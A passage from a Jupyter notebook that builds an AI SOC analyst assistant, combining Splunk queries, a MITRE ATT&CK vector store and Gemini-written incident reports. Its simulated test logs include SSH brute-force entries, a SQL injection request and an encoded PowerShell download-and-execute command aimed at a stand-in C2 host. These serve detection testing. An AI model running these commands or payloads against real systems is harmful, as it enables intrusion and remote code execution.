    "        incident_summary=\"Simulated multiple failed SSH login attempts, a successful login, an attempted SQL Injection, and an encoded PowerShell command on an endpoint.\"\n",
    "    )\n",
    "    print(\"\\n--- Final Incident Report ---\")\n",
    "    print(incident_report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "55f3edd5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Starting AI SOC Analyst Assistant (Full Architecture) ---\n",
      "\n",
      "--- Checking/Populating Security Knowledge Base ---\n",
      "MITRE ATT&CK data already present in knowledge base (823 techniques found).\n",
      "Sample security knowledge appears to be present. Skipping population.\n",
      "\n",
      "Total unique documents in knowledge base: 826\n",
      "\n",
      "\n",
      "=== Running Combined Simulated Scenario (with MITRE Mapping) ===\n",
      "--- Starting AI SOC Analyst Assistant for query ---\n",
      "DEBUG: Splunk query string:\n",
      "```\n",
      "| makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time\n",
      "```\n",
      "Attempting to connect to Splunk at https://127.0.0.1:8089...\n",
      "Successfully connected to Splunk.\n",
      "DEBUG: Successfully obtained Splunk service object. Type: <class 'splunklib.client.Service'>\n",
      "Retrieving data from Splunk...\n",
      "Attempting to run Splunk query:\n",
      "```\n",
      "| makeresults count=6\n",
      "| streamstats count as rn\n",
      "| eval _time = case(\n",
      "    rn=1, relative_time(now(), \"-30s\"),\n",
      "    rn=2, relative_time(now(), \"-25s\"),\n",
      "    rn=3, relative_time(now(), \"-20s\"),\n",
      "    rn=4, relative_time(now(), \"-15s\"),\n",
      "    rn=5, relative_time(now(), \"-10s\"),\n",
      "    rn=6, relative_time(now(), \"-5s\")\n",
      "  )\n",
      "| eval host = case(\n",
      "    rn <= 5, \"webserver-01\",\n",
      "    rn=6, \"endpoint-05\"\n",
      "  )\n",
      "| eval source = case(\n",
      "    rn <= 4, \"/var/log/auth.log\",\n",
      "    rn=5, \"/var/log/apache2/access.log\",\n",
      "    rn=6, \"PowerShell Operational Log\"\n",
      "  )\n",
      "| eval _raw = case(\n",
      "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
      "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
      "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\" 404 200 \\\"-\\\" \\\"Mozilla/5.0\\\"\",\n",
      "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
      "  )\n",
      "| table _time, host, source, _raw\n",
      "| sort _time\n",
      "```\n",
      "Splunk Job ID: 1748151447.76\n",
      "Job 1748151447.76 status: PARSING\n",
      "Job 1748151447.76 status: PARSING\n",
      "Job 1748151447.76 status: PARSING\n",
      "Job 1748151447.76 status: PARSING\n",
      "Splunk search job 1748151447.76 is DONE. Final dispatch state: DONE\n",
      "Successfully retrieved 6 events from Splunk for Job ID 1748151447.76.\n",
      "\n",
      "--- Final Incident Report ---\n",
      "None\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\mohamed elmadany\\AppData\\Local\\Temp\\ipykernel_37924\\3447050755.py:94: DeprecatedWarning: ResultsReader is deprecated. Use the JSONResultsReader function instead in conjuction with the 'output_mode' query param set to 'json'\n",
      "  reader = results.ResultsReader(job.results())\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import time # Added for time.sleep\n",
    "import json # Added for JSON handling if needed, though not directly used in the current version of the STIX loading\n",
    "from dotenv import load_dotenv\n",
    "\n",
    "# Splunk SDK imports\n",
    "import splunklib.client as client\n",
    "import splunklib.results as results\n",
    "\n",
    "# ChromaDB import\n",
    "import chromadb\n",
    "\n",
    "# Google Gemini imports\n",
    "import google.generativeai as genai\n",
    "\n",
    "# STIX2 imports for MITRE ATT&CK parsing\n",
    "from stix2 import MemoryStore, Filter, AttackPattern, Relationship\n",
    "\n",
    "# Load environment variables from app.env file\n",
    "load_dotenv(\"app.env\")\n",
    "\n",
    "# --- Configuration ---\n",
    "SPLUNK_HOST = os.environ.get(\"SPLUNK_HOST\", \"127.0.0.1\")\n",
    "SPLUNK_PORT = int(os.environ.get(\"SPLUNK_PORT\", 8089))\n",
    "SPLUNK_USERNAME = os.environ.get(\"SPLUNK_USERNAME\", \"admin\")\n",
    "SPLUNK_PASSWORD = os.environ.get(\"SPLUNK_PASSWORD\", \"changeme\") # IMPORTANT: Update this in app.env\n",
    "SPLUNK_TOKEN = os.environ.get(\"SPLUNK_TOKEN\") # Optional, not used in current connect_to_splunk\n",
    "\n",
    "GEMINI_API_KEY = os.environ.get(\"GEMINI_API_KEY\")\n",
    "if not GEMINI_API_KEY:\n",
    "    raise ValueError(\"GEMINI_API_KEY environment variable not set. Get your key from Google AI Studio (https://makersuite.google.com/).\")\n",
    "\n",
    "# Configure Google Gemini\n",
    "genai.configure(api_key=GEMINI_API_KEY)\n",
    "llm = genai.GenerativeModel('gemini-pro') # For text generation\n",
    "embedding_model = 'embedding-001' # For embeddings\n",
    "\n",
    "# ChromaDB Settings\n",
    "CHROMA_DB_PATH = \"./chroma_db\"\n",
    "chroma_client = chromadb.PersistentClient(path=CHROMA_DB_PATH)\n",
    "SECURITY_COLLECTION_NAME = \"security_knowledge\"\n",
    "security_collection = chroma_client.get_or_create_collection(SECURITY_COLLECTION_NAME)\n",
    "\n",
    "# MITRE ATT&CK Data File Path\n",
    "MITRE_STIX_JSON_PATH = \"enterprise-attack.json\" # Ensure this file is in the same directory as this script\n",
    "\n",
    "# --- Splunk Connection & Query Functions ---\n",
    "def connect_to_splunk():\n",
    "    \"\"\"Connects to Splunk and returns a Service object.\"\"\"\n",
    "    connection_url = f\"https://{SPLUNK_HOST}:{SPLUNK_PORT}\"\n",
    "    print(f\"Attempting to connect to Splunk at {connection_url}...\")\n",
    "    try:\n",
    "        service = client.connect(\n",
    "            host=SPLUNK_HOST,\n",
    "            port=SPLUNK_PORT,\n",
    "            username=SPLUNK_USERNAME,\n",
    "            password=SPLUNK_PASSWORD,\n",
    "            scheme=\"https\", # Changed from http - Crucial for 8089\n",
    "            verify=False # IMPORTANT: For testing with self-signed certs. Use True with a proper CA bundle in production!\n",
    "        )\n",
    "        print(\"Successfully connected to Splunk.\")\n",
    "        return service\n",
    "    except Exception as e:\n",
    "        print(f\"Error connecting to Splunk: {e}\")\n",
    "        return None\n",
    "\n",
    "def run_splunk_query(service, query, earliest_time=\"-1h\", latest_time=\"now\", output_mode=\"json\"):\n",
    "    \"\"\"\n",
    "    Runs a Splunk search query and returns the results.\n",
    "    \"\"\"\n",
    "    print(f\"Attempting to run Splunk query:\\n```\\n{query}\\n```\")\n",
    "    try:\n",
    "        kwargs = {\n",
    "            \"earliest_time\": earliest_time,\n",
    "            \"latest_time\": latest_time,\n",
    "            \"output_mode\": output_mode,\n",
    "            \"app\": \"search\"\n",
    "        }\n",
    "        job = service.jobs.create(query, **kwargs)\n",
    "\n",
    "        print(f\"Splunk Job ID: {job.sid}\")\n",
    "        # Wait for the job to complete\n",
    "        while not job.is_ready():\n",
    "            time.sleep(0.1)\n",
    "            # Print the current dispatch state of the job for more detailed debugging\n",
    "            print(f\"Job {job.sid} status: {job.content.get('dispatchState')}\") \n",
    "\n",
    "        # After job is ready, check if it's done or if there are messages\n",
    "        if job.is_done():\n",
    "            print(f\"Splunk search job {job.sid} is DONE. Final dispatch state: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Check for messages even if done (warnings, etc.)\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "\n",
    "            reader = results.ResultsReader(job.results())\n",
    "            events = []\n",
    "            for item in reader:\n",
    "                events.append(item)\n",
    "            job.cancel() # Clean up the search job to free resources on Splunk\n",
    "            print(f\"Successfully retrieved {len(events)} events from Splunk for Job ID {job.sid}.\")\n",
    "            return events\n",
    "        else: # This block handles cases where the job might not complete successfully\n",
    "            print(f\"Splunk search job {job.sid} did not complete successfully. Final status: {job.content.get('dispatchState')}\")\n",
    "            if job.messages: # Print any error/warning messages\n",
    "                print(f\"Job {job.sid} messages: {job.messages}\")\n",
    "            job.cancel()\n",
    "            return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error running Splunk query: {e}\")\n",
    "        return []\n",
    "    \n",
    "# --- Embedding & ChromaDB Functions ---\n",
    "def get_embedding(text):\n",
    "    \"\"\"Generates an embedding for the given text using the specified Gemini embedding model.\"\"\"\n",
    "    try:\n",
    "        # Use RETRIEVAL_DOCUMENT for texts meant to be retrieved (like knowledge base entries)\n",
    "        response = genai.embed_content(model=embedding_model, content=text, task_type=\"RETRIEVAL_DOCUMENT\")\n",
    "        return response['embedding']\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating embedding for text (first 50 chars): '{text[:50]}...': {e}\")\n",
    "        return None\n",
    "\n",
    "def load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH):\n",
    "    \"\"\"Loads MITRE ATT&CK techniques from a STIX 2.x JSON file.\"\"\"\n",
    "    print(f\"Loading MITRE ATT&CK data from {stix_json_path} using stix2...\")\n",
    "    try:\n",
    "        stix_store = MemoryStore()\n",
    "        stix_store.load_from_file(stix_json_path)\n",
    "        \n",
    "        attack_data_points = []\n",
    "        # Query for all Attack Pattern objects\n",
    "        techniques = stix_store.query(Filter(\"type\", \"=\", \"attack-pattern\"))\n",
    "\n",
    "        for tech in techniques:\n",
    "            # Extract MITRE ID (e.g., T1000) from external_references\n",
    "            mitre_id = None\n",
    "            for ext_ref in tech.external_references:\n",
    "                if ext_ref.get('source_name') == 'mitre-attack' and 'external_id' in ext_ref:\n",
    "                    if ext_ref['external_id'].startswith('T'):\n",
    "                        mitre_id = ext_ref['external_id']\n",
    "                        break\n",
    "            if not mitre_id:\n",
    "                # print(f\"Warning: Skipping technique with no valid MITRE ID: {tech.name}\")\n",
    "                continue # Skip techniques without a T-number ID\n",
    "\n",
    "            description = tech.description if hasattr(tech, 'description') else \"No description available.\"\n",
    "            \n",
    "            # Extract Tactics using x_mitre_tactic_refs (STIX2 standard way)\n",
    "            tactics_names = []\n",
    "            if hasattr(tech, 'x_mitre_tactic_refs'):\n",
    "                for tactic_ref_id in tech.x_mitre_tactic_refs:\n",
    "                    tactic_sdo = stix_store.get(tactic_ref_id)\n",
    "                    if tactic_sdo and tactic_sdo.type == 'tactic':\n",
    "                        tactics_names.append(tactic_sdo.name)\n",
    "            tactics_str = ', '.join(tactics_names) if tactics_names else 'N/A'\n",
    "            \n",
    "            # Construct full text for embedding\n",
    "            full_text = (\n",
    "                f\"MITRE ATT&CK Technique: {tech.name} (ID: {mitre_id})\\n\"\n",
    "                f\"Tactics: {tactics_str}\\n\"\n",
    "                f\"Description: {description}\\n\"\n",
    "                f\"URL: {tech.external_references[0]['url'] if tech.external_references else 'N/A'}\"\n",
    "            )\n",
    "            \n",
    "            attack_data_points.append({\n",
    "                \"id\": mitre_id,\n",
    "                \"text\": full_text,\n",
    "                \"metadata\": {\n",
    "                    \"type\": \"mitre_attack_technique\",\n",
    "                    \"technique_id\": mitre_id,\n",
    "                    \"technique_name\": tech.name,\n",
    "                    \"tactics\": tactics_str,\n",
    "                    \"is_subtechnique\": tech.x_mitre_is_subtechnique if hasattr(tech, 'x_mitre_is_subtechnique') else False,\n",
    "                    \"source_file\": stix_json_path\n",
    "                }\n",
    "            })\n",
    "        print(f\"Loaded {len(attack_data_points)} MITRE ATT&CK techniques.\")\n",
    "        return attack_data_points\n",
    "    except FileNotFoundError:\n",
    "        print(f\"Error: MITRE ATT&CK STIX JSON file not found at '{stix_json_path}'\")\n",
    "        print(\"Please download 'enterprise-attack.json' from https://attack.mitre.org/resources/attack-data-and-tools/ and place it in the script's directory.\")\n",
    "        return []\n",
    "    except Exception as e:\n",
    "        print(f\"Error loading MITRE ATT&CK data: {e}\")\n",
    "        return []\n",
    "\n",
    "def populate_security_knowledge_base(data_points):\n",
    "    \"\"\"Populates the ChromaDB collection with security knowledge data points, avoiding duplicates.\"\"\"\n",
    "    print(f\"Attempting to add {len(data_points)} documents to the knowledge base.\")\n",
    "    \n",
    "    # Get existing IDs to prevent adding duplicates\n",
    "    existing_ids_result = security_collection.get(include=[])\n",
    "    existing_ids = set(existing_ids_result.get('ids', []))\n",
    "\n",
    "    docs_to_add = []\n",
    "    embeddings_to_add = []\n",
    "    metadatas_to_add = []\n",
    "    ids_to_add = []\n",
    "\n",
    "    for dp in data_points:\n",
    "        unique_id = dp.get(\"id\")\n",
    "        if not unique_id:\n",
    "            # Generate a unique ID if not provided (e.g., for custom knowledge)\n",
    "            unique_id = f\"custom_knowledge_{hash(dp['text'])}\"\n",
    "\n",
    "        if unique_id in existing_ids:\n",
    "            # print(f\"Skipping existing document with ID: {unique_id}\") # Uncomment for verbose debugging\n",
    "            continue\n",
    "\n",
    "        embedding = get_embedding(dp[\"text\"])\n",
    "        if embedding is not None: # Ensure embedding was successfully generated\n",
    "            docs_to_add.append(dp[\"text\"])\n",
    "            embeddings_to_add.append(embedding)\n",
    "            metadatas_to_add.append(dp.get(\"metadata\", {}))\n",
    "            ids_to_add.append(unique_id)\n",
    "        else:\n",
    "            print(f\"Skipping document due to embedding failure: {dp['text'][:50]}...\")\n",
    "\n",
    "    if docs_to_add:\n",
    "        try:\n",
    "            security_collection.add(\n",
    "                documents=docs_to_add,\n",
    "                embeddings=embeddings_to_add,\n",
    "                metadatas=metadatas_to_add,\n",
    "                ids=ids_to_add\n",
    "            )\n",
    "            print(f\"Populated vector store with {len(docs_to_add)} new security knowledge documents.\")\n",
    "        except Exception as e:\n",
    "            print(f\"Error adding documents to ChromaDB: {e}\")\n",
    "    else:\n",
    "        print(\"No new unique documents to add to the vector store.\")\n",
    "\n",
    "def search_security_knowledge_base(query_text, n_results=5, filter_metadata=None):\n",
    "    \"\"\"\n",
    "    Searches the ChromaDB knowledge base for relevant documents.\n",
    "    Args:\n",
    "        query_text (str): The text to search for.\n",
    "        n_results (int): Number of results to return.\n",
    "        filter_metadata (dict, optional): A dictionary to filter results by metadata.\n",
    "                                          E.g., {\"type\": \"mitre_attack_technique\"}.\n",
    "    Returns:\n",
    "        dict: ChromaDB query results (documents, distances, metadatas).\n",
    "    \"\"\"\n",
    "    query_embedding = get_embedding(query_text)\n",
    "    if query_embedding is not None:\n",
    "        results = security_collection.query(\n",
    "            query_embeddings=[query_embedding],\n",
    "            n_results=n_results,\n",
    "            include=['documents', 'distances', 'metadatas'],\n",
    "            where=filter_metadata # Apply metadata filtering if provided\n",
    "        )\n",
    "        return results\n",
    "    return None\n",
    "\n",
    "# --- AI Report Generation Function ---\n",
    "def generate_incident_report(splunk_logs, relevant_knowledge, mitre_mappings, incident_summary=\"\"):\n",
    "    \"\"\"\n",
    "    Generates a comprehensive security incident report using Gemini.\n",
    "    \"\"\"\n",
    "    # Format MITRE details for the prompt\n",
    "    mitre_details_str = \"\"\n",
    "    if mitre_mappings:\n",
    "        mitre_details_str = \"\\n**Potential MITRE ATT&CK Mappings:**\\n\"\n",
    "        for mapping in mitre_mappings:\n",
    "            mitre_details_str += f\"* **Technique:** {mapping.get('technique_name', 'N/A')} ({mapping.get('technique_id', 'N/A')})\\n\"\n",
    "            if mapping.get('tactics') and mapping['tactics'] != 'N/A':\n",
    "                mitre_details_str += f\"  **Tactics:** {mapping['tactics']}\\n\"\n",
    "            # Ensure description is a string and handle potential truncation\n",
    "            description_text = str(mapping.get('description', 'No description.')).strip()\n",
    "            mitre_details_str += f\"  **Description:** {description_text[:200]}...\\n\"\n",
    "            mitre_details_str += f\"  **Confidence (similarity score):** {mapping.get('distance_score', 0.0):.4f}\\n\"\n",
    "\n",
    "    # Main prompt for Gemini\n",
    "    prompt = f\"\"\"\n",
    "You are an AI-driven SOC analyst assistant. Your task is to generate a concise and informative incident report based on the provided Splunk logs, relevant security knowledge, and potential MITRE ATT&CK mappings.\n",
    "\n",
    "---\n",
    "**Splunk Logs (Raw Data for Context):**\n",
    "{splunk_logs}\n",
    "\n",
    "---\n",
    "**Relevant Security Knowledge (from Vector Store - e.g., playbooks, past incidents):**\n",
    "{relevant_knowledge if relevant_knowledge else \"No specific relevant security knowledge found.\"}\n",
    "\n",
    "---\n",
    "**Potential MITRE ATT&CK Mappings (Most Relevant First):**\n",
    "{mitre_details_str if mitre_details_str else \"No specific MITRE ATT&CK mappings found or provided. Analyze logs for common adversary behaviors.\"}\n",
    "\n",
    "---\n",
    "**Incident Summary (if provided by human analyst):**\n",
    "{incident_summary if incident_summary else \"No specific summary provided, analyze logs for key details.\"}\n",
    "\n",
    "---\n",
    "**Instructions for Report Generation:**\n",
    "1.  **Incident Title:** Create a clear and descriptive title for the incident.\n",
    "2.  **Date/Time of Detection:** Extract the earliest and latest timestamps from the logs. Provide a range if multiple times.\n",
    "3.  **Affected Systems/Users:** Identify specific hosts, IP addresses, or users mentioned in the logs.\n",
    "4.  **Description of Incident:** Summarize the observed events chronologically. **Crucially, explain how the observed behavior aligns with the most relevant MITRE ATT&CK Tactics and Techniques, referencing their IDs and names from the provided mappings.**\n",
    "5.  **Attack Vector/Technique (MITRE ATT&CK IDs and names):** Explicitly list the *most relevant* MITRE ATT&CK Tactics and Techniques identified (e.g., \"T1078 - Valid Accounts, T1110 - Brute Force\").\n",
    "6.  **Impact:** Briefly describe the potential impact of this incident (e.g., data breach, service disruption, account compromise, unauthorized access).\n",
    "7.  **Recommended Actions/Remediation:** Based on relevant knowledge (playbooks) and log analysis, suggest immediate and long-term actions for containment, eradication, and recovery.\n",
    "8.  **Status:** (e.g., New Incident, In Progress, Contained, Resolved) - Default to \"New Incident\" if unsure.\n",
    "9.  **Analyst Notes:** Any other observations, open questions, or next steps for further investigation.\n",
    "\n",
    "Please present the report in a clear, markdown-formatted structure, focusing on actionable intelligence.\n",
    "\"\"\"\n",
    "    try:\n",
    "        response = llm.generate_content(prompt)\n",
    "        return response.text\n",
    "    except Exception as e:\n",
    "        print(f\"Error generating incident report with Gemini: {e}\")\n",
    "        return \"Failed to generate incident report.\"\n",
    "\n",
    "# --- Main Orchestration Logic ---\n",
    "def ai_soc_analyst_assistant(splunk_query, incident_summary=\"\", distance_threshold=0.3):\n",
    "    print(f\"--- Starting AI SOC Analyst Assistant for query ---\")\n",
    "    print(f\"DEBUG: Splunk query string:\\n```\\n{splunk_query}\\n```\")\n",
    "\n",
    "    splunk_service = connect_to_splunk()\n",
    "\n",
    "    # --- ADD THESE DIAGNOSTIC PRINTS ---\n",
    "    if splunk_service:\n",
    "        print(f\"DEBUG: Successfully obtained Splunk service object. Type: {type(splunk_service)}\")\n",
    "    else:\n",
    "        print(\"DEBUG: Splunk service object is None. Connection likely failed or returned None.\")\n",
    "        return \"Failed to connect to Splunk. Cannot proceed.\"\n",
    "    # --- END OF DIAGNOSTIC PRINTS ---\n",
    "\n",
    "    print(\"Retrieving data from Splunk...\")\n",
    "\n",
    "    raw_splunk_events = run_splunk_query(splunk_service, splunk_query, earliest_time=\"-24h\", latest_time=\"now\")\n",
    "\n",
    "    if not raw_splunk_events:\n",
    "        print(\"No relevant Splunk logs found for the given query.\")\n",
    "\n",
    "# --- Main Execution Block ---\n",
    "if __name__ == \"__main__\":\n",
    "    print(\"--- Starting AI SOC Analyst Assistant (Full Architecture) ---\")\n",
    "\n",
    "    # --- Step 0: Ensure Security Knowledge Base is Populated ---\n",
    "    print(\"\\n--- Checking/Populating Security Knowledge Base ---\")\n",
    "    total_docs_in_db = security_collection.count()\n",
    "    \n",
    "    needs_mitre_population = False\n",
    "    if total_docs_in_db == 0:\n",
    "        needs_mitre_population = True\n",
    "        print(\"ChromaDB collection is currently empty. MITRE ATT&CK data and sample knowledge need to be populated.\")\n",
    "    else:\n",
    "        try:\n",
    "            # Check if MITRE ATT&CK techniques are present\n",
    "            mitre_techniques_in_db = security_collection.get(where={\"type\": \"mitre_attack_technique\"}, include=[])\n",
    "            if len(mitre_techniques_in_db['ids']) == 0:\n",
    "                needs_mitre_population = True\n",
    "                print(\"MITRE ATT&CK data not present in knowledge base. Populating now...\")\n",
    "            else:\n",
    "                print(f\"MITRE ATT&CK data already present in knowledge base ({len(mitre_techniques_in_db['ids'])} techniques found).\")\n",
    "        except Exception as e:\n",
    "            print(f\"Warning: Error checking for existing MITRE data: {e}. Assuming MITRE data needs population.\")\n",
    "            needs_mitre_population = True\n",
    "\n",
    "    if needs_mitre_population:\n",
    "        mitre_data_points = load_mitre_attack_data(stix_json_path=MITRE_STIX_JSON_PATH)\n",
    "        if mitre_data_points:\n",
    "            populate_security_knowledge_base(mitre_data_points)\n",
    "        else:\n",
    "            print(\"MITRE ATT&CK data not loaded from file. AI mapping might be less effective.\")\n",
    "    \n",
    "    # Add sample general security knowledge (playbooks, past incidents) if not already present\n",
    "    sample_data_ids = [\"playbook_phishing_response\", \"playbook_malware_containment\", \"inc_003_unauth_db_access\"]\n",
    "    sample_data_present = False\n",
    "    try:\n",
    "        # Check if at least one of the sample data IDs exists\n",
    "        if security_collection.get(ids=[sample_data_ids[0]], include=[])['ids']:\n",
    "            sample_data_present = True\n",
    "    except Exception as e:\n",
    "        print(f\"Warning: Error checking for sample data: {e}. Will attempt to add.\")\n",
    "        sample_data_present = False\n",
    "\n",
    "    if not sample_data_present:\n",
    "        print(\"Sample security knowledge not fully present. Populating now...\")\n",
    "        sample_security_knowledge = [\n",
    "            {\"id\": \"playbook_phishing_response\", \"text\": \"Playbook: Phishing Incident Response. Trigger: User reports suspicious email or email gateway alert. Steps: 1. Verify email authenticity (headers, sender reputation). 2. Check for malicious attachments/links (sandbox). 3. If malicious, remove email from all affected inboxes. 4. Reset user password if credentials compromised. 5. Educate user. 6. Block malicious sender/domains at firewall/proxy. 7. Log and document. Severity: Medium to High depending on compromise.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"phishing\"}},\n",
    "            {\"id\": \"playbook_malware_containment\", \"text\": \"Playbook: Malware Containment and Eradication. Trigger: EDR alert, antivirus detection, or user report of suspicious activity. Steps: 1. Isolate infected host(s) from network immediately. 2. Collect forensic data (memory dump, process list). 3. Run full endpoint scan. 4. Identify persistence mechanisms (registry, scheduled tasks, services). 5. Remove malware and persistence. 6. Restore affected files from clean backup. 7. Update security definitions. Severity: High.\", \"metadata\": {\"type\": \"playbook\", \"incident_type\": \"malware\"}},\n",
    "            {\"id\": \"inc_003_unauth_db_access\", \"text\": \"Past Incident: Incident ID INC-2024-003. Type: Unauthorized Access - Database. Date: 2024-05-10. Affected: Customer Database (MySQL). Attack Vector: Brute force via SSH followed by database privilege escalation. Description: Numerous failed SSH logins from external IP, then successful login to 'admin' account, followed by `SELECT * FROM users;` queries. Containment: Blocked source IP at firewall, disabled compromised admin account, rotated DB credentials. Impact: Potential exfiltration of customer PII. Lessons Learned: Implement MFA for all admin accounts, stronger password policies. MITRE ATT&CK T1078 (Valid Accounts), T1110 (Brute Force).\", \"metadata\": {\"type\": \"past_incident\", \"incident_type\": \"unauthorized_access\", \"mitre_id\": \"T1078, T1110\"}},\n",
    "        ]\n",
    "        populate_security_knowledge_base(sample_security_knowledge)\n",
    "    else:\n",
    "        print(\"Sample security knowledge appears to be present. Skipping population.\")\n",
    "\n",
    "    print(f\"\\nTotal unique documents in knowledge base: {security_collection.count()}\")\n",
    "\n",
    "    # --- Run a combined simulated scenario ---\n",
    "    # This Splunk query generates mock logs that hint at various security events.\n",
    "    splunk_simulated_logs = \"\"\"| makeresults count=6\n",
    "| streamstats count as rn\n",
    "| eval _time = case(\n",
    "    rn=1, relative_time(now(), \"-30s\"),\n",
    "    rn=2, relative_time(now(), \"-25s\"),\n",
    "    rn=3, relative_time(now(), \"-20s\"),\n",
    "    rn=4, relative_time(now(), \"-15s\"),\n",
    "    rn=5, relative_time(now(), \"-10s\"),\n",
    "    rn=6, relative_time(now(), \"-5s\")\n",
    "  )\n",
    "| eval host = case(\n",
    "    rn <= 5, \"webserver-01\",\n",
    "    rn=6, \"endpoint-05\"\n",
    "  )\n",
    "| eval source = case(\n",
    "    rn <= 4, \"/var/log/auth.log\",\n",
    "    rn=5, \"/var/log/apache2/access.log\",\n",
    "    rn=6, \"PowerShell Operational Log\"\n",
    "  )\n",
    "| eval _raw = case(\n",
    "    rn=1, \"May 24 09:30:00 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=2, \"May 24 09:30:05 webserver-01 sshd[12345]: Failed password for invalid user root from 192.168.1.10 port 54321 ssh2\",\n",
    "    rn=3, \"May 24 09:30:10 webserver-01 sshd[12345]: Failed password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=4, \"May 24 09:30:15 webserver-01 sshd[12345]: Accepted password for user admin from 192.168.1.10 port 54322 ssh2\",\n",
    "    rn=5, \"192.168.1.10 - - [24/May/2025:09:30:20 +0000] \\\\\"GET /admin.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1\\\\\" 404 200 \\\\\"-\\\\\" \\\\\"Mozilla/5.0\\\\\"\",\n",
    "    rn=6, \"powershell.exe -NoP -NonI -Exec Bypass -EncodedCommand SQBFAFgAKAAoAE4AZwBvAE0ALgBJAEUAdwAgACgAIgBoAHQAdABwAHM6Ly9jMi5mYWtlZG9vbWFpbi9wYWF5bG9hZC5wc2AwIgApKQAKAA==\"\n",
    "  )\n",
    "| table _time, host, source, _raw\n",
    "| sort _time\"\"\"\n",
    "\n",
    "    print(\"\\n\\n=== Running Combined Simulated Scenario (with MITRE Mapping) ===\")\n",
    "    incident_report = ai_soc_analyst_assistant(\n",
    "        splunk_simulated_logs,\n",
    "        incident_summary=\"Simulated multiple failed SSH login attempts, a successful login, an attempted SQL Injection, and an encoded PowerShell command on an endpoint.\"\n",
    "    )\n",
    "    print(\"\\n--- Final Incident Report ---\")\n",
    "    print(incident_report)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "785e6dc0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--- Starting AI SOC Analyst Assistant (Full Architecture) ---\n",
      "\n",
      "--- Checking/Populating Security Knowledge Base ---\n",
      "Missing MITRE techniques (823) or mitigations (0). Repopulating...\n",
      "Clearing existing ChromaDB collection to repopulate with fresh MITRE data...\n",
      "Loading MITRE ATT&CK data from enterprise-attack.json using stix2...\n",
      "Loaded 823 MITRE ATT&CK techniques.\n",
      "Loaded 0 MITRE ATT&CK mitigations.\n",
      "Attempting to add 823 documents to the knowledge base.\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mKeyboardInterrupt\u001b[39m                         Traceback (most recent call last)",
